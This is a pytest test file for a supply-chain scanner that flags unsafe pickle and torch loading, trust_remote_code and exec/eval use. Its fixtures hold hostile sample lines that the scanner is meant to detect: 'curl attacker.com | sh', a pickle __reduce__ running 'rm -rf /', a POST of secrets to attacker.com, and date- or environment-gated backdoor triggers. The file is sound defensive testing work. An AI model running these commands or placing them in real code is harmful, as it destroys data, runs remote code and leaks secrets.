"""
Unit tests for Supply Chain Scanner

Tests Pickle exploit detection, HuggingFace risks, sleeper patterns.

Generated: 2026-01-07
"""

import pytest
from supply_chain_scanner import SupplyChainScanner, scan, RiskLevel


class TestSupplyChainScanner:
    """Tests for SupplyChainScanner."""

    @pytest.fixture
    def scanner(self):
        return SupplyChainScanner()

    # =========================================================================
    # Pickle Exploit Tests
    # =========================================================================

    def test_pickle_load_detection(self, scanner):
        """Detect pickle.load() usage."""
        code = '''
import pickle
with open("model.pkl", "rb") as f:
    model = pickle.load(f)
'''
        result = scanner.scan(code)
        assert result.detected
        assert result.risk_score > 0.5
        assert any(f.category == "pickle_exploit" for f in result.findings)

    def test_torch_load_unsafe(self, scanner):
        """Detect unsafe torch.load() without map_location."""
        code = '''
import torch
model = torch.load("model.pt")
'''
        result = scanner.scan(code)
        assert result.detected
        assert any("torch" in f.context.lower() for f in result.findings)

    def test_torch_load_safe(self, scanner):
        """Safe torch.load() with weights_only=True should reduce risk."""
        code = '''
import torch
model = torch.load("model.pt", map_location="cpu", weights_only=True)
'''
        result = scanner.scan(code)
        assert len(result.safe_patterns_found) > 0

    def test_pickle_reduce_method(self, scanner):
        """Detect __reduce__ magic method."""
        code = '''
class Exploit:
    def __reduce__(self):
        return (os.system, ("rm -rf /",))
'''
        result = scanner.scan(code)
        assert result.detected
        assert result.risk_score > 0.5

    # =========================================================================
    # HuggingFace Risk Tests
    # =========================================================================

    def test_trust_remote_code_true(self, scanner):
        """Detect trust_remote_code=True."""
        code = '''
from transformers import AutoModel
model = AutoModel.from_pretrained("user/model", trust_remote_code=True)
'''
        result = scanner.scan(code)
        assert result.detected
        assert any(f.category == "huggingface_risk" for f in result.findings)

    def test_trust_remote_code_false(self, scanner):
        """trust_remote_code=False should be safe."""
        code = '''
model = AutoModel.from_pretrained("user/model", trust_remote_code=False)
'''
        result = scanner.scan(code)
        # Should find as safe pattern
        assert any("trust_remote_code" in p for p in result.safe_patterns_found)

    def test_unsafe_model_loading(self, scanner):
        """Detect loading unsafe-flagged model."""
        code = '''
model = AutoModel.from_pretrained("user/unsafe-model")
'''
        result = scanner.scan(code, filename="load_unsafe.py")
        # May or may not detect depending on model name
        assert result is not None

    # =========================================================================
    # Code Execution Tests
    # =========================================================================

    def test_exec_detection(self, scanner):
        """Detect exec() in model code."""
        code = '''
def load_model(path):
    with open(path) as f:
        code = f.read()
    exec(code)
'''
        result = scanner.scan(code)
        assert result.detected
        assert any(f.category == "code_execution" for f in result.findings)

    def test_eval_detection(self, scanner):
        """Detect eval() in model code."""
        code = '''
config = eval(config_string)
'''
        result = scanner.scan(code)
        assert result.detected

    def test_os_system_detection(self, scanner):
        """Detect os.system() calls."""
        code = '''
import os
os.system("curl attacker.com | sh")
'''
        result = scanner.scan(code)
        assert result.detected
        assert result.risk_score > 0.5

    # =========================================================================
    # Exfiltration Tests
    # =========================================================================

    def test_http_exfil_detection(self, scanner):
        """Detect HTTP exfiltration."""
        code = '''
import requests
requests.post("https://attacker.com/exfil", data=secrets)
'''
        result = scanner.scan(code)
        assert result.detected
        assert any(f.category == "exfiltration" for f in result.findings)

    def test_socket_detection(self, scanner):
        """Detect raw socket usage."""
        code = '''
import socket
s = socket.socket()
s.connect(("attacker.com", 443))
'''
        result = scanner.scan(code)
        assert result.detected

    # =========================================================================
    # Sleeper Agent Tests
    # =========================================================================

    def test_date_trigger_detection(self, scanner):
        """Detect date-based sleeper trigger."""
        code = '''
import datetime
if datetime.datetime.now().year >= 2026:
    inject_exploit()
'''
        result = scanner.scan(code)
        assert result.detected
        assert any(f.category == "sleeper_agent" for f in result.findings)

    def test_env_trigger_detection(self, scanner):
        """Detect environment-based trigger."""
        code = '''
import os
if os.environ.get("PRODUCTION") == "true":
    enable_backdoor()
'''
        result = scanner.scan(code)
        assert result.detected

    # =========================================================================
    # Safe Pattern Tests
    # =========================================================================

    def test_safetensors_loading(self, scanner):
        """Safetensors loading should be detected as safe."""
        code = '''
from safetensors.torch import load_file
model = load_file("model.safetensors")
'''
        result = scanner.scan(code)
        assert "safetensors" in str(result.safe_patterns_found).lower()

    def test_onnx_loading(self, scanner):
        """ONNX loading should be safe."""
        code = '''
import onnxruntime as ort
session = ort.InferenceSession("model.onnx")
'''
        result = scanner.scan(code)
        assert "onnx" in str(result.safe_patterns_found).lower()

    # =========================================================================
    # Edge Cases
    # =========================================================================

    def test_empty_content(self, scanner):
        """Empty content should be clean."""
        result = scanner.scan("")
        assert not result.detected
        assert result.risk_score == 0.0

    def test_clean_code(self, scanner):
        """Clean code should pass."""
        code = '''
def add(a, b):
    return a + b

result = add(1, 2)
print(result)
'''
        result = scanner.scan(code)
        assert not result.detected
        assert result.risk_score == 0.0


# Run with: pytest test_supply_chain_scanner.py -v
